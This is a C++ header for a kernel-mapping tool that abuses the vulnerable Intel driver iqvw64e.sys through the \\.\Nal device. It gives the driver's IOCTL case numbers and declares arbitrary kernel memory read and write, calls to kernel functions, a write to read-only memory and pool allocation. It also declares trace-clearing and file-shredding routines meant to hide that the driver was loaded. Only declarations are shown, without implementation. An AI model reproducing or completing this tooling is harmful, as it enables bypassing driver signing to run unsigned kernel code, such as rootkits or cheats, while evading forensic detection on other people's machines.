#pragma once

#include <cstdint>
#include <string>
#include <vector>

/* iqvw64e.sys (Intel network diagnostic, device \\.\Nal) primitive.
   IOCTL 0x80862007. Case numbers are the public ones used by the Nal dispatcher:
   0x33 copy, 0x30 fill, 0x25 virtual-to-physical, 0x19 map IO, 0x1A unmap IO.
   The driver image is not shipped. The caller passes a path to a copy they have. */

struct Nal {
	void* device = (void*)(intptr_t)-1;
	uint64_t ntos = 0;
	uint64_t ci = 0;
	std::wstring service;
	std::wstring directory;
	std::wstring filename;
	std::wstring path;
	uint32_t timestamp = 0;
	std::string last_error;
	uint64_t nt_add_atom = 0;
	uint64_t mm_alloc_pages = 0;
	uint64_t mm_free_pages = 0;
	uint64_t mm_set_prot = 0;
	uint64_t ex_alloc = 0;
	uint64_t ex_free = 0;
	uint64_t ke_delay = 0;

	bool open_from(const std::wstring& source);
	void close_and_shred();
	bool read(uint64_t addr, void* buf, size_t size);
	bool write(uint64_t addr, const void* buf, size_t size);
	bool write_ro(uint64_t addr, const void* buf, size_t size);
	bool call4(uint64_t* out, uint64_t fn, uint64_t a = 0, uint64_t b = 0, uint64_t c = 0, uint64_t d = 0);
	uint64_t kernel_export(uint64_t module, const char* name);
	uint64_t find_pattern(uint64_t start, uint32_t size, const uint8_t* sig, const char* mask);
	uint64_t resolve_rel(uint64_t instr, int disp_off, int instr_len);
	bool resolve_helpers();
	uint64_t alloc_independent(uint64_t size);
	bool free_independent(uint64_t addr, uint64_t size);
	bool protect(uint64_t addr, uint64_t size, uint32_t prot);
	uint64_t alloc_pool(uint64_t size, uint32_t tag);
	bool free_pool(uint64_t addr);
	bool clear_traces();
};

void nal_log_system_state();
std::string nal_sha256_file(const std::wstring& path);
